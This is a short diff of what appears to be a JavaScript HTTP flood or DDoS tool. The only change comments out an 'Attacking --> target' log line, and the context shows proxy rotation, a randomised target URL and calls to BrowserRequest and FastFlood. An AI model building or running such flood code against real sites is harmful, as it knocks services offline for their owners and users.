@@ -49,7 +49,7 @@ function BrowserEngine()
 
     target = originTarget.replace(/%RAND%/g, RandomString(RandomInteger(4, 16)));
 
-    console.log(chalk.green(`Attacking --> ${target} Proxy --> [${proxy}]`));
+    //console.log(chalk.green(`Attacking --> ${target} Proxy --> [${proxy}]`));
     
     BrowserRequest(target, proxy, userAgent, referer);
     FastFlood(target, targetHost, method, proxy, userAgent, referer);
